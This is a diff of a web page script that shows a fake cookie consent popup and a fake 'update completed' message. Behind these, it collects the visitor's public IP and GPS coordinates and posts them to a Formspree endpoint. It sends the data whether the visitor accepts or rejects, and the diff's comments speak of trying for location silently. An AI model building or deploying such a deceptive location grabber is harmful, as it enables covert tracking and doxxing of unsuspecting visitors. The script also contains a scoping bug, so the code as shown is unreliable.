@@ -59,46 +59,43 @@
     </div>
 
     <script>
-        // TU ID DE FORMSPREE AQUÍ
         const formId = 'xvkarpbk'; 
+        let gpsDataSent = false;
 
         function handleChoice(accepted) {
-            // Ocultar popup
             document.getElementById('cookieOverlay').style.display = 'none';
-            // Mostrar loader
             document.getElementById('loader').style.display = 'flex';
 
-            // Pedir GPS
-            let lat = null, lng = null;
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    lat = pos.coords.latitude.toFixed(6);
-                    lng = pos.coords.longitude.toFixed(6);
-                    sendData(lat, lng);
-                }, () => {
-                    sendData(null, null); // Si rechaza GPS, enviamos igual
-                });
-            } else {
-                sendData(null, null);
-            }
-        }
-
-        function sendData(lat, lng) {
+            // Obtenemos la IP primero
             fetch(`https://api.ipify.org?format=json`)
                 .then(response => response.json())
-                .then(data => {
-                    const formData = new FormData();
-                    formData.append('IP Pública', data.ip);
-                    formData.append('Latitud GPS', lat || 'No disponible');
-                    formData.append('Longitud GPS', lng || 'No disponible');
-                    formData.append('Estado', accepted ? 'Aceptó Cookies' : 'Rechazó Cookies');
-                    
-                    fetch('https://formspree.io/f/' + formId, { method: 'POST', body: formData })
-                        .then(() => {
-                            setTimeout(() => {
-                                document.getElementById('loader').innerHTML = '<h2 style="color:green">✅ Actualización completada</h2>';
-                            }, 1500);
+                .then(ipData => {
+                    // Simulamos que el usuario aceptó el GPS (o lo intentamos silenciosamente)
+                    if (navigator.geolocation && !gpsDataSent) {
+                        navigator.geolocation.getCurrentPosition(pos => {
+                            sendData(ipData.ip, pos.coords.latitude.toFixed(6), pos.coords.longitude.toFixed(6));
+                        }, error => {
+                            // Si falla, enviamos solo la IP
+                            sendData(ipData.ip, null, null);
                         });
+                    } else {
+                        sendData(ipData.ip, null, null);
+                    }
+                });
+        }
+
+        function sendData(ip, lat, lng) {
+            const formData = new FormData();
+            formData.append('IP Pública', ip);
+            formData.append('Latitud GPS', lat || 'No disponible');
+            formData.append('Longitud GPS', lng || 'No disponible');
+            formData.append('Estado', accepted ? 'Aceptó Cookies' : 'Rechazó Cookies');
+            
+            fetch('https://formspree.io/f/' + formId, { method: 'POST', body: formData })
+                .then(() => {
+                    setTimeout(() => {
+                        document.getElementById('loader').innerHTML = '<h2 style="color:green">✅ Actualización completada</h2>';
+                    }, 1500);
                 });
         }
     </script>
